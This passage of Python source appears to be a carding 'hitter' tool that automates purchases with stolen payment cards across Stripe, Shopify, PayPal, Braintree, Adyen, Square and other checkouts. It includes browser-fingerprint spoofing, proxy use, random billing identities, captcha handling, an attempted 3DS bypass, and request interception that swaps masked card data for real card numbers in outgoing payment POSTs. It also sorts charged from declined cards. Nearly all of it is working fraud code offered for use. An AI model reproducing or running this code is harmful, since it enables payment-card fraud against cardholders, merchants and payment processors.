        'input[data-frames="expiry-date"]', '#expiry-date', 'input[name="expiry"]',
        'input[placeholder*="MM/YY"]', 'input[placeholder*="MM / YY"]',
        '[data-testid="expiry-date"]',
    ]
    CVC_SELECTORS = [
        'input[data-frames="cvv"]', '#cvv', 'input[name="cvv"]',
        'input[placeholder*="CVC"]', 'input[placeholder*="CVV"]', '[data-testid="cvv"]',
    ]
    NAME_SELECTORS  = ['input[data-frames="name"]', '#name', 'input[name="name"]',
                       'input[placeholder*="Name on card"]', '[data-testid="cardholder-name"]']
    EMAIL_SELECTORS = ['input[type="email"]', '#email', 'input[name="email"]',
                       'input[placeholder*="email"]']
    SUBMIT_SELECTORS= ['button[type="submit"]', '.pay-button', '[data-testid="pay-button"]',
                       'button:has-text("Pay")', 'button:has-text("Submit")']

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        async def intercept_route(route: Route, request: Request):
            if request.method == "POST" and ("checkout.com" in request.url or "api.checkout.com" in request.url):
                pd = request.post_data or ""
                c  = self.real_card
                if c:
                    pd = pd.replace(self.MASKED_CARD,          c["card"])
                    pd = pd.replace(self.MASKED_EXPIRY[:2],    c["month"])
                    pd = pd.replace(self.MASKED_EXPIRY[3:5],   c["year"])
                    pd = pd.replace(self.MASKED_CVV,           c["cvv"])
                    pd = re.sub(r'"expiryMonth"\s*:\s*"01"', f'"expiryMonth":"{c["month"]}"', pd)
                    pd = re.sub(r'"expiryYear"\s*:\s*"30"',  f'"expiryYear":"{c["year"]}"',  pd)
                    await route.continue_(post_data=pd); return
            await route.continue_()
        await self.page.route("**/*", intercept_route)

# ── Shopify ───────────────────────────────────────────────────────────────────
class ShopifyAutofill(BaseAutofill):
    CARD_SELECTORS = [
        '#number', 'input[name="number"]', '[autocomplete="cc-number"]',
        'input[aria-label="Card number"]', '[data-testid="card-number"]',
        'input[placeholder*="Card number"]', '.card-number',
    ]
    EXPIRY_SELECTORS = [
        '#expiry', 'input[name="expiry"]', '[autocomplete="cc-exp"]',
        'input[aria-label="Expiry date"]', '[data-testid="expiry-date"]',
        'input[placeholder*="MM/YY"]', '.expiry-date',
    ]
    CVC_SELECTORS = [
        '#verification_value', 'input[name="verification_value"]', '[autocomplete="cc-csc"]',
        'input[aria-label="Security code"]', '[data-testid="security-code"]',
        'input[placeholder*="CVC"]', '.cvv',
    ]
    NAME_SELECTORS  = ['#name', 'input[name="name"]', '[autocomplete="cc-name"]',
                       'input[aria-label="Name on card"]', '[data-testid="cardholder-name"]']
    EMAIL_SELECTORS = ['#email', 'input[name="email"]', 'input[type="email"]',
                       'input[aria-label="Email"]', '[data-testid="email"]']
    SUBMIT_SELECTORS= ['button[type="submit"]', '[data-testid="pay-button"]', '.pay-button',
                       'button:has-text("Pay")', 'button:has-text("Complete order")']

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        async def intercept_route(route: Route, request: Request):
            if request.method == "POST" and (
                "shopify.com" in request.url or "myshopify.com" in request.url or "stripe.com" in request.url
            ):
                pd = request.post_data or ""
                c  = self.real_card
                if c:
                    pd = pd.replace(self.MASKED_CARD,          c["card"])
                    pd = pd.replace(self.MASKED_EXPIRY[:2],    c["month"])
                    pd = pd.replace(self.MASKED_EXPIRY[3:5],   c["year"])
                    pd = pd.replace(self.MASKED_CVV,           c["cvv"])
                    pd = re.sub(r'credit_card\[number\]=\d+',             f'credit_card[number]={c["card"]}', pd)
                    pd = re.sub(r'credit_card\[month\]=\d+',              f'credit_card[month]={c["month"]}', pd)
                    pd = re.sub(r'credit_card\[year\]=\d+',               f'credit_card[year]={c["year"]}', pd)
                    pd = re.sub(r'credit_card\[verification_value\]=\d+', f'credit_card[verification_value]={c["cvv"]}', pd)
                    await route.continue_(post_data=pd); return
            await route.continue_()
        await self.page.route("**/*", intercept_route)

# ── PayPal ────────────────────────────────────────────────────────────────────
class PayPalAutofill(BaseAutofill):
    CARD_SELECTORS   = ['#card-number', 'input[name="cardNumber"]', '[autocomplete="cc-number"]',
                        'input[aria-label="Card number"]', '[data-testid="card-number"]',
                        'input[placeholder*="Card number"]']
    EXPIRY_SELECTORS = ['#exp-date', 'input[name="expDate"]', '[autocomplete="cc-exp"]',
                        'input[aria-label="Expiration date"]', '[data-testid="expiry-date"]',
                        'input[placeholder*="MM/YY"]']
    CVC_SELECTORS    = ['#cvv', 'input[name="cvv"]', '[autocomplete="cc-csc"]',
                        'input[aria-label="Security code"]', '[data-testid="cvv"]',
                        'input[placeholder*="CVC"]']
    NAME_SELECTORS   = ['#cardholder-name', 'input[name="cardholderName"]', '[autocomplete="cc-name"]',
                        'input[aria-label="Name on card"]', '[data-testid="cardholder-name"]']
    EMAIL_SELECTORS  = ['#email', 'input[name="email"]', 'input[type="email"]']
    SUBMIT_SELECTORS = ['button[type="submit"]', '[data-testid="pay-button"]', '.pay-button',
                        'button:has-text("Pay Now")', 'button:has-text("Pay")']

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        async def intercept_route(route: Route, request: Request):
            if request.method == "POST" and ("paypal.com" in request.url or "braintreegateway.com" in request.url):
                pd = request.post_data or ""
                c  = self.real_card
                if c:
                    pd = pd.replace(self.MASKED_CARD,          c["card"])
                    pd = pd.replace(self.MASKED_EXPIRY[:2],    c["month"])
                    pd = pd.replace(self.MASKED_EXPIRY[3:5],   c["year"])
                    pd = pd.replace(self.MASKED_CVV,           c["cvv"])
                    pd = re.sub(r'credit_card\[number\]=\d+',             f'credit_card[number]={c["card"]}', pd)
                    pd = re.sub(r'credit_card\[expiration_month\]=\d+',   f'credit_card[expiration_month]={c["month"]}', pd)
                    pd = re.sub(r'credit_card\[expiration_year\]=\d+',    f'credit_card[expiration_year]={c["year"]}', pd)
                    pd = re.sub(r'credit_card\[cvv\]=\d+',                f'credit_card[cvv]={c["cvv"]}', pd)
                    await route.continue_(post_data=pd); return
            await route.continue_()
        await self.page.route("**/*", intercept_route)

# ── Braintree ─────────────────────────────────────────────────────────────────
class BraintreeAutofill(BaseAutofill):
    CARD_SELECTORS   = ['input[data-braintree-name="number"]', '#credit-card-number',
                        'input[name="credit_card[number]"]', 'input[autocomplete="cc-number"]',
                        'input[placeholder*="Card number"]', 'input[aria-label="Card number"]']
    EXPIRY_SELECTORS = ['input[data-braintree-name="expiration_date"]', '#expiration-date',
                        'input[name="credit_card[expiration_date]"]', 'input[placeholder*="MM/YY"]',
                        'input[aria-label="Expiration date"]']
    CVC_SELECTORS    = ['input[data-braintree-name="cvv"]', '#cvv',
                        'input[name="credit_card[cvv]"]', 'input[placeholder*="CVC"]',
                        'input[aria-label="Security code"]']
    NAME_SELECTORS   = ['input[data-braintree-name="cardholder_name"]', '#cardholder-name',
                        'input[name="credit_card[cardholder_name]"]', '[autocomplete="cc-name"]',
                        'input[placeholder*="Name on card"]']
    EMAIL_SELECTORS  = ['input[type="email"]', '#email', 'input[name="email"]']
    SUBMIT_SELECTORS = ['button[type="submit"]', '.pay-button', '[data-testid="pay-button"]',
                        'button:has-text("Pay")', 'button:has-text("Submit")']

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        async def intercept_route(route: Route, request: Request):
            if request.method == "POST" and ("braintreegateway.com" in request.url or "braintree" in request.url):
                pd = request.post_data or ""
                c  = self.real_card
                if c:
                    pd = pd.replace(self.MASKED_CARD,   c["card"])
                    pd = pd.replace(self.MASKED_EXPIRY, f"{c['month']}/{c['year']}")
                    pd = pd.replace(self.MASKED_CVV,    c["cvv"])
                    pd = re.sub(r'credit_card\[number\]=\d+',         f'credit_card[number]={c["card"]}', pd)
                    pd = re.sub(r'credit_card\[expiration_date\]=\S+', f'credit_card[expiration_date]={c["month"]}/{c["year"]}', pd)
                    pd = re.sub(r'credit_card\[cvv\]=\d+',             f'credit_card[cvv]={c["cvv"]}', pd)
                    await route.continue_(post_data=pd); return
            await route.continue_()
        await self.page.route("**/*", intercept_route)

# ── Adyen ─────────────────────────────────────────────────────────────────────
class AdyenAutofill(BaseAutofill):
    CARD_SELECTORS   = ['#cardNumber', 'input[name="cardNumber"]', '[data-cse="number"]',
                        'input[placeholder*="Card number"]', 'input[aria-label="Card number"]',
                        '.card-number-input']
    EXPIRY_SELECTORS = ['#expiryDate', 'input[name="expiryDate"]', '[data-cse="expiryMonth"]',
                        'input[placeholder*="MM/YY"]', 'input[aria-label="Expiry date"]',
                        '.expiry-date-input']
    CVC_SELECTORS    = ['#cvc', 'input[name="cvc"]', '[data-cse="cvc"]',
                        'input[placeholder*="CVC"]', 'input[aria-label="Security code"]', '.cvc-input']
    NAME_SELECTORS   = ['#cardholderName', 'input[name="cardholderName"]', '[data-cse="holderName"]',
                        'input[placeholder*="Name on card"]', 'input[aria-label="Name on card"]']
    EMAIL_SELECTORS  = ['input[type="email"]', '#email', 'input[name="email"]']
    SUBMIT_SELECTORS = ['button[type="submit"]', '.adyen-checkout__button', '[data-testid="pay-button"]',
                        'button:has-text("Pay")', 'button:has-text("Submit")']

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        async def intercept_route(route: Route, request: Request):
            if request.method == "POST" and ("adyen.com" in request.url or "checkoutshopper" in request.url):
                pd = request.post_data or ""
                c  = self.real_card
                if c:
                    pd = pd.replace(self.MASKED_CARD,          c["card"])
                    pd = pd.replace(self.MASKED_EXPIRY[:2],    c["month"])
                    pd = pd.replace(self.MASKED_EXPIRY[3:5],   c["year"])
                    pd = pd.replace(self.MASKED_CVV,           c["cvv"])
                    pd = re.sub(r'"number"\s*:\s*"[^"]*"',     f'"number":"{c["card"]}"', pd)
                    pd = re.sub(r'"expiryMonth"\s*:\s*"[^"]*"', f'"expiryMonth":"{c["month"]}"', pd)
                    pd = re.sub(r'"expiryYear"\s*:\s*"[^"]*"',  f'"expiryYear":"{c["year"]}"',  pd)
                    pd = re.sub(r'"cvc"\s*:\s*"[^"]*"',         f'"cvc":"{c["cvv"]}"',           pd)
                    await route.continue_(post_data=pd); return
            await route.continue_()
        await self.page.route("**/*", intercept_route)

# ── Square ────────────────────────────────────────────────────────────────────
class SquareAutofill(BaseAutofill):
    CARD_SELECTORS   = ['input[name="card_number"]', '#card-number', '[autocomplete="cc-number"]',
                        'input[placeholder*="Card number"]', 'input[aria-label="Card number"]', '.sq-card-number']
    EXPIRY_SELECTORS = ['input[name="expiration_date"]', '#expiration-date', '[autocomplete="cc-exp"]',
                        'input[placeholder*="MM/YY"]', 'input[aria-label="Expiration date"]', '.sq-expiration-date']
    CVC_SELECTORS    = ['input[name="cvv"]', '#cvv', '[autocomplete="cc-csc"]',
                        'input[placeholder*="CVC"]', 'input[aria-label="Security code"]', '.sq-cvv']
    NAME_SELECTORS   = ['input[name="cardholder_name"]', '#cardholder-name', '[autocomplete="cc-name"]',
                        'input[placeholder*="Name on card"]']
    EMAIL_SELECTORS  = ['input[type="email"]', '#email', 'input[name="email"]']
    SUBMIT_SELECTORS = ['button[type="submit"]', '.pay-button', '[data-testid="pay-button"]',
                        'button:has-text("Pay")', 'button:has-text("Submit")']

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        async def intercept_route(route: Route, request: Request):
            if request.method == "POST" and ("squareup.com" in request.url or "square" in request.url):
                pd = request.post_data or ""
                c  = self.real_card
                if c:
                    pd = pd.replace(self.MASKED_CARD,          c["card"])
                    pd = pd.replace(self.MASKED_EXPIRY[:2],    c["month"])
                    pd = pd.replace(self.MASKED_EXPIRY[3:5],   c["year"])
                    pd = pd.replace(self.MASKED_CVV,           c["cvv"])
                    pd = re.sub(r'card_number=\d+',         f'card_number={c["card"]}', pd)
                    pd = re.sub(r'expiration_date=\S+', f'expiration_date={c["month"]}%2F{c["year"]}', pd)
                    pd = re.sub(r'cvv=\d+',              f'cvv={c["cvv"]}', pd)
                    await route.continue_(post_data=pd); return
            await route.continue_()
        await self.page.route("**/*", intercept_route)

# ── Generic (Mollie, Klarna, AuthNet, WooCommerce, BigCommerce, Wix, Ecwid) ──
class GenericAutofill(BaseAutofill):
    """Generic provider: all common selectors, replaces masked values in POST."""
    CARD_SELECTORS = [
        'input[name="cardNumber"]','#cardNumber','#card-number','input[name="card_number"]',
        'input[name="x_card_num"]','[autocomplete="cc-number"]',
        'input[placeholder*="Card number"]','input[aria-label*="Card number"]',
        '#wc-stripe-card-number','.card-number','#credit-card-number',
        'input[data-frames="card-number"]','input[data-braintree-name="number"]',
        '#number','input[name="number"]',
    ]
    EXPIRY_SELECTORS = [
        'input[name="expiryDate"]','#expiryDate','#expiry-date','input[name="expiry"]',
        'input[name="x_exp_date"]','[autocomplete="cc-exp"]','input[placeholder*="MM/YY"]',
        '#cardExpiry','input[name="expDate"]','#expiry','input[name="expirydate"]',
        'input[data-frames="expiry-date"]','input[data-braintree-name="expiration_date"]',
        '#expiration-date','input[placeholder*="MM / YY"]',
    ]
    CVC_SELECTORS = [
        '#cvv','input[name="cvv"]','input[name="x_card_code"]','[autocomplete="cc-csc"]',
        'input[placeholder*="CVC"]','input[placeholder*="CVV"]','input[placeholder*="Security"]',
        '#wc-stripe-cvc','#cvc','input[data-frames="cvv"]',
        'input[data-braintree-name="cvv"]','#verification_value','input[name="verification_value"]',
    ]
    NAME_SELECTORS = [
        '#cardholderName','input[name="cardholderName"]','input[name="x_card_name"]',
        '[autocomplete="cc-name"]','input[placeholder*="Name on card"]',
        'input[name="cardholder_name"]','#cardholder-name','#billingName',
        'input[placeholder*="Cardholder"]',
    ]
    EMAIL_SELECTORS = [
        'input[type="email"]','#email','input[name="email"]',
        '#billing_email','input[name="billing_email"]','input[placeholder*="Email"]',
    ]
    SUBMIT_SELECTORS = [
        'button[type="submit"]','.pay-button','[data-testid="pay-button"]',
        '#place_order','button:has-text("Pay")','button:has-text("Submit")',
        'button:has-text("Place order")','button:has-text("Complete order")',
        'button:has-text("Pay Now")','button:has-text("Donate")',
        'button:has-text("Subscribe")','button:has-text("Confirm")',
        '.SubmitButton','input[value="Place Order"]',
    ]
    # Domain filter for intercept
    _DOMAINS: List[str] = []

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        domains = self.__class__._DOMAINS

        async def intercept_route(route: Route, request: Request):
            if request.method == "POST":
                matches = (not domains) or any(d in request.url for d in domains)
                if matches:
                    pd = request.post_data or ""
                    c  = self.real_card
                    if c:
                        pd = pd.replace(self.MASKED_CARD,          c["card"])
                        pd = pd.replace(self.MASKED_EXPIRY[:2],    c["month"])
                        pd = pd.replace(self.MASKED_EXPIRY[3:5],   c["year"])
                        pd = pd.replace(self.MASKED_CVV,           c["cvv"])
                        await route.continue_(post_data=pd); return
            await route.continue_()
        await self.page.route("**/*", intercept_route)


def _make_provider(domains: List[str]):
    class Prov(GenericAutofill):
        _DOMAINS = domains
    return Prov


MollieAutofill       = _make_provider(["mollie.com", "api.mollie.com"])
KlarnaAutofill       = _make_provider(["klarna.com", "api.klarna.com"])
AuthorizeNetAutofill = _make_provider(["authorize.net", "authorizenet"])
WooCommerceAutofill  = _make_provider(["woocommerce", "wc-api", "wp-json/wc"])
BigCommerceAutofill  = _make_provider(["bigcommerce.com", "bigcommerce"])
WixAutofill          = _make_provider(["wix.com", "_api/wix-ecommerce"])
EcwidAutofill        = _make_provider(["ecwid.com", "app.ecwid.com"])

AUTOFILL_MAP = {
    "stripe":       StripeAutofill,
    "checkoutcom":  CheckoutComAutofill,
    "shopify":      ShopifyAutofill,
    "paypal":       PayPalAutofill,
    "braintree":    BraintreeAutofill,
    "adyen":        AdyenAutofill,
    "square":       SquareAutofill,
    "mollie":       MollieAutofill,
    "klarna":       KlarnaAutofill,
    "authorizenet": AuthorizeNetAutofill,
    "woocommerce":  WooCommerceAutofill,
    "bigcommerce":  BigCommerceAutofill,
    "wix":          WixAutofill,
    "ecwid":        EcwidAutofill,
}

# ── Screenshot helper ─────────────────────────────────────────────────────────
async def take_screenshot(page: Page, label: str) -> Optional[str]:
    try:
        ts   = datetime.now().strftime("%Y%m%d_%H%M%S_%f")
        path = os.path.join(SCREENSHOT_DIR, f"{label}_{ts}.png")
        await page.screenshot(path=path, full_page=False)
        return path
    except Exception:
        return None

# ── Result Detection ──────────────────────────────────────────────────────────
_SUCCESS_URL_KW  = ("receipt","thank","order_confirmation","order-received",
                    "thankyou","thank-you","payment_success","paid",
                    "payment-success","order-confirmed","success")
_SUCCESS_BODY_KW = ("order confirmed","payment confirmed","payment successful",
                    "thank you for your order","thank you for your purchase",
                    "your order has been placed","successfully charged",
                    "order received","payment complete","transaction approved")
_DECLINE_KW      = ("card was declined","your card was declined","do_not_honor",
                    "insufficient funds","card declined","payment failed",
                    "card not supported","incorrect cvc","expired card",
                    "invalid card","processing error","do not honor",
                    "transaction declined","unable to process")

def _check_result(url: str, body: str):
    u = url.lower()
    b = body.lower()
    # If still on Stripe/CKO checkout page — don't count URL keywords as success
    still_checkout = ("checkout.stripe.com" in u or
                      "checkout.com/pay" in u or
                      "/c/pay/" in u)
    if not still_checkout:
        if any(k in u for k in _SUCCESS_URL_KW):
            return True, None
    if any(k in b for k in _SUCCESS_BODY_KW):
        return True, None
    for kw in _DECLINE_KW:
        if kw in b:
            return False, kw.replace(" ", "_")
    return False, "unknown"

# ── Hitter Engine ─────────────────────────────────────────────────────────────
StepCallback = Callable[[str], Awaitable[None]]

class HitterEngine:
    def __init__(self, proxy: Optional[str] = None,
                 email: str = None, name: str = None):
        self.proxy    = proxy
        self.email    = email   # None = use random billing email
        self.name_val = name    # None = use random billing name
        self.results:  List[Dict] = []
        self.successes = 0
        self.fails     = 0
        self._sem      = asyncio.Semaphore(MAX_CONCURRENT)

    async def hit(self, url: str, card: Dict, merchant: str, product: str,
                  amount: str, attempt: int,
                  step_cb: Optional[StepCallback] = None) -> Dict:
        async with self._sem:
            return await self._hit(url, card, merchant, product, amount, attempt, step_cb)

    async def _cb(self, cb: Optional[StepCallback], msg: str):
        if cb:
            try:
                await cb(msg)
            except Exception:
                pass

    async def _hit(self, url: str, card: Dict, merchant: str, product: str,
                   amount: str, attempt: int,
                   step_cb: Optional[StepCallback]) -> Dict:
        t0   = time.time()
        res: Dict = {
            "attempt": attempt, "card": card,
            "success": False, "decline_code": None,
            "receipt_url": None, "response_time": 0,
            "error": None, "screenshot": None,
        }

        await self._cb(step_cb, f"🌐 Opening browser for card {attempt}…")
        try:
            async with async_playwright() as pw:
                fp   = Fingerprint.generate()
                args = ["--disable-blink-features=AutomationControlled",
                        "--no-sandbox", "--disable-setuid-sandbox",
                        "--disable-dev-shm-usage"]
                if self.proxy:
                    args.append(f"--proxy-server={self.proxy}")

                browser = await pw.chromium.launch(headless=True, args=args)
                ctx     = await browser.new_context(
                    user_agent=fp["user_agent"], viewport=fp["viewport"],
                    locale=fp["locale"], timezone_id=fp["timezone_id"],
                    ignore_https_errors=True)
                page = await ctx.new_page()
                await page.add_init_script(Fingerprint.STEALTH)

                await self._cb(step_cb, "📡 Loading checkout page…")
                await page.goto(url, timeout=60000, wait_until="domcontentloaded")
                await asyncio.sleep(2)

                html     = await page.content()
                provider = detect_provider(url, html)
                await self._cb(step_cb, f"🔌 Provider: <b>{provider}</b>")

                # pick a random billing profile for this hit
                billing = get_random_billing()
                if self.email:
                    billing["email"] = self.email
                if self.name_val:
                    billing["name"]       = self.name_val
                    parts = self.name_val.strip().split(None, 1)
                    billing["first_name"] = parts[0]
                    billing["last_name"]  = parts[1] if len(parts) > 1 else parts[0]

                await self._cb(step_cb,
                    f"🏠 Billing: <code>{billing['name']}</code> • "
                    f"{billing['city']}, {billing['country_name']}")

                af_cls = AUTOFILL_MAP.get(provider, GenericAutofill)
                af     = af_cls(page, email=billing.get("email"),
                                name=billing.get("name"), billing=billing)

                await af.handle_captcha()
                await af.enable_card_replace(card)

                await self._cb(step_cb, "💳 Filling card fields…")
                await af.fill_card(card)
                await af.fill_billing()
                await self._cb(step_cb, "📋 Billing filled")

                # Screenshot BEFORE submit — shows filled form state
                ss_before = await take_screenshot(page, f"card_{attempt}_filled")

                await self._cb(step_cb, "🖱 Clicking submit…")
                submitted = await af.submit()
                if not submitted:
                    res.update({"decline_code": "submit_not_found",
                                "error": "Submit button not found",
                                "response_time": round(time.time()-t0, 2),
                                "screenshot": ss_before})
                    self.fails += 1
                    await self._cb(step_cb, "❌ Submit button not found")
                    await browser.close()
                    self.results.append(res)
                    return res

                await self._cb(step_cb, "⏳ Waiting for response…")
                await asyncio.sleep(5)

                if await af.wait_for_3ds(10000):
                    await self._cb(step_cb, "🔐 3DS detected — bypassing…")
                    await af.auto_complete_3ds()
                    await asyncio.sleep(5)

                await af.handle_captcha()

                res["response_time"] = round(time.time()-t0, 2)
                # Screenshot AFTER response — shows result/decline page
                ss = await take_screenshot(page, f"card_{attempt}_result")
                res["screenshot"] = ss
                # keep pre-submit screenshot separately for debug
                res["screenshot_before"] = ss_before

                cur_url = page.url
                body    = ""
                try:
                    body = await page.text_content("body") or ""
                except Exception:
                    pass

                success, decline_code = _check_result(cur_url, body)
                if success:
                    res.update({"success": True, "receipt_url": cur_url})
                    ss2 = await take_screenshot(page, f"card_{attempt}_HIT")
                    res["screenshot"] = ss2
                    self.successes += 1
                    await self._cb(step_cb, "✅ Payment successful!")
                    # delete intermediate screenshots
                    for old_ss in (ss, ss_before):
                        if old_ss and old_ss != ss2:
                            try: os.remove(old_ss)
                            except Exception: pass
                else:
                    res["decline_code"] = decline_code or "unknown"
                    self.fails += 1
                    await self._cb(step_cb, f"❌ Declined: {decline_code or 'unknown'}")
                    # delete pre-submit screenshot (keep result screenshot)
                    if ss_before and ss_before != ss:
                        try: os.remove(ss_before)
                        except Exception: pass

                await browser.close()

        except Exception as e:
            res.update({"error": str(e), "decline_code": "exception",
                        "response_time": round(time.time()-t0, 2)})
            self.fails += 1

        self.results.append(res)
        return res
